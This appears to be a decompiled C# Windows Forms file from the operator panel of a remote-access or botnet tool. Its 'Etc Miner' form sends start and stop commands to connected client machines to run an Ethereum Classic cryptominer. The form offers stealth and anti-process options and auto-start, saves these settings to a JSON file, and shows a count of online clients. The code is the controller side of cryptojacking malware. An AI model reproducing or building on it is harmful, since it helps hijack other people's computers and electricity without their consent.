using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using CustomControls.RJControls;
using MaterialSkin;
using MaterialSkin.Controls;
using Newtonsoft.Json;
using Server.Connectings;
using Server.Data;
using Server.Helper;

namespace Server.Forms
{
	// Token: 0x020000A4 RID: 164
	public partial class FormMinerEtc : FormMaterial
	{
		// Token: 0x0600049C RID: 1180 RVA: 0x0003B7BA File Offset: 0x000399BA
		public FormMinerEtc()
		{
			this.InitializeComponent();
			base.FormClosing += this.Closing1;
		}

		// Token: 0x0600049D RID: 1181 RVA: 0x0003B7DC File Offset: 0x000399DC
		private void FormProcess_Load(object sender, EventArgs e)
		{
			MaterialSkinManager.Instance.ThemeChanged += this.ChangeScheme;
			this.ChangeScheme(this);
			this.timer1.Start();
			if (File.Exists("local\\MinerEtc.json"))
			{
				MinerXMR minerXMR = JsonConvert.DeserializeObject<MinerXMR>(File.ReadAllText("local\\MinerEtc.json"));
				this.materialSwitch1.Checked = minerXMR.AntiProcess;
				this.materialSwitch3.Checked = minerXMR.Stealth;
				this.rjTextBox3.Texts = minerXMR.ArgsStealh;
				this.rjTextBox2.Texts = minerXMR.Args;
				if (minerXMR.AutoStart)
				{
					this.materialSwitch2.Checked = true;
					this.work = true;
					this.materialSwitch7.Checked = true;
				}
			}
		}

		// Token: 0x0600049E RID: 1182 RVA: 0x0003B898 File Offset: 0x00039A98
		private void ChangeScheme(object sender)
		{
			this.rjTextBox2.BorderColor = FormMaterial.PrimaryColor;
			this.rjTextBox3.BorderColor = FormMaterial.PrimaryColor;
			this.rjButton1.BorderColor = FormMaterial.PrimaryColor;
			this.rjButton1.ForeColor = FormMaterial.PrimaryColor;
			this.GridClients.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
			this.GridClients.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
			this.GridClients.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
			this.GridClients.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		}

		// Token: 0x0600049F RID: 1183 RVA: 0x0003B93C File Offset: 0x00039B3C
		public Clients[] ClientsAll()
		{
			List<Clients> list = new List<Clients>();
			foreach (object obj in ((IEnumerable)this.GridClients.Rows))
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				list.Add((Clients)dataGridViewRow.Tag);
			}
			return list.ToArray();
		}

		// Token: 0x060004A0 RID: 1184 RVA: 0x0003B9B0 File Offset: 0x00039BB0
		private void Closing1(object sender, FormClosingEventArgs e)
		{
			this.work = false;
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients client = array[i];
				Task.Run(delegate()
				{
					client.Disconnect();
				});
			}
			this.GridClients.Rows.Clear();
			base.Hide();
			this.Save();
			e.Cancel = true;
		}

		// Token: 0x060004A1 RID: 1185 RVA: 0x0003BA1C File Offset: 0x00039C1C
		private void Save()
		{
			File.WriteAllText("local\\MinerEtc.json", JsonConvert.SerializeObject(new MinerEtc
			{
				AntiProcess = this.materialSwitch1.Checked,
				Stealth = this.materialSwitch3.Checked,
				ArgsStealh = this.rjTextBox3.Texts,
				AutoStart = this.materialSwitch2.Checked,
				Args = this.rjTextBox2.Texts
			}, Formatting.Indented));
		}

		// Token: 0x060004A2 RID: 1186 RVA: 0x0003BA98 File Offset: 0x00039C98
		public object[] Args()
		{
			if (this.materialSwitch3.Checked)
			{
				return new object[]
				{
					"Start",
					this.materialSwitch1.Checked,
					this.rjTextBox2.Texts,
					this.rjTextBox3.Texts
				};
			}
			return new object[]
			{
				"Start",
				this.materialSwitch1.Checked,
				this.rjTextBox2.Texts
			};
		}

		// Token: 0x060004A3 RID: 1187 RVA: 0x0003BB1F File Offset: 0x00039D1F
		private void rjButton1_Click(object sender, EventArgs e)
		{
			base.Hide();
		}

		// Token: 0x060004A4 RID: 1188 RVA: 0x0003BB28 File Offset: 0x00039D28
		private void materialSwitch7_CheckedChanged(object sender, EventArgs e)
		{
			if (this.materialSwitch7.Checked)
			{
				if (string.IsNullOrEmpty(this.rjTextBox2.Texts))
				{
					return;
				}
				Clients[] array = this.ClientsAll();
				for (int i = 0; i < array.Length; i++)
				{
					array[i].Send(this.Args());
				}
			}
			else
			{
				Clients[] array = this.ClientsAll();
				for (int i = 0; i < array.Length; i++)
				{
					array[i].Send(new object[]
					{
						"Stop"
					});
				}
			}
			this.Save();
		}

		// Token: 0x060004A5 RID: 1189 RVA: 0x0003BBAB File Offset: 0x00039DAB
		private void timer1_Tick(object sender, EventArgs e)
		{
			this.Text = string.Format("Etc Miner           Online [{0}]", this.GridClients.Rows.Count);
		}

		// Token: 0x060004A6 RID: 1190 RVA: 0x0003BBD2 File Offset: 0x00039DD2
		private void materialSwitch2_CheckedChanged(object sender, EventArgs e)
		{
			this.Save();
		}

		// Token: 0x04000309 RID: 777
		public bool work;
	}
}
